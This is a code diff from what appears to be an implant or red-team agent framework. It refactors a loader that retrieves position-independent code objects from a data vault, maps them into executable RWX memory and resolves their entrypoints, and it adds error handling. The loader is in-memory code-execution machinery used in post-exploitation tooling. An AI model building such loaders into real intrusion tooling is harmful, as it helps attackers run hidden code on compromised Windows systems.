@@ -28,31 +28,32 @@ void load_builtin_picos(DataVault *vault) {
 	for (int i = 0; i < getuid->length; i++) { getuid->value[i] = 0; }
 }
 
-ResolvedPico resolve_loaded_pico(DataVault *vault, char *key) {
+BOOL resolve_loaded_pico(DataVault *vault, ResolvedPico *pico, char *key) {
 	WIN32FUNCS funcs;
 	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
 	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
 	funcs.VirtualAlloc = (__typeof__(VirtualAlloc) *) KERNEL32$VirtualAlloc;
-	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree;
+	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree; // TODO move these into agent state
 
 	DataBuffer databuf = { 0 };
-	retrieve_from_vault(vault, &databuf, key);
+	BOOL result = retrieve_from_vault(vault, &databuf, key);
+	if (result == FALSE) { return FALSE; }
+	
 	char *buf = resolve_databuffer(vault, &databuf);
 	
 	// Note that buf is a pointer into the vault, which might become invalid if the vault is extended (reallocated).
 	// It's the caller's responsibility to resolve the pico, invoke it, then free it BEFORE calling add_to_vault() again.
 	
-	ResolvedPico pico = { 0 };
-	pico.codelen = PicoCodeSize(buf);
-	pico.code = KERNEL32$VirtualAlloc(NULL, pico.codelen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE); // TODO allocate RW and reprotect after calling PicoLoad()
-	pico.datalen = PicoDataSize(buf);
-	pico.data = KERNEL32$VirtualAlloc(NULL, pico.datalen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
+	pico->codelen = PicoCodeSize(buf);
+	pico->code = KERNEL32$VirtualAlloc(NULL, pico->codelen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE); // TODO allocate RW and reprotect after calling PicoLoad()
+	pico->datalen = PicoDataSize(buf);
+	pico->data = KERNEL32$VirtualAlloc(NULL, pico->datalen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
 	
-	PicoLoad((IMPORTFUNCS *) &funcs, buf, pico.code, pico.data);
-	pico.entrypoint = PicoEntryPoint(buf, pico.code);
+	PicoLoad((IMPORTFUNCS *) &funcs, buf, pico->code, pico->data);
+	pico->entrypoint = PicoEntryPoint(buf, pico->code);
 	
-	return pico;
-} // TODO error handling - what if the pico can't be loaded? and then add checks to places where picos get resolved
+	return TRUE;
+}
 
 void free_resolved_pico(ResolvedPico *pico) {
 	KERNEL32$VirtualFree(pico->code, 0, MEM_RELEASE);
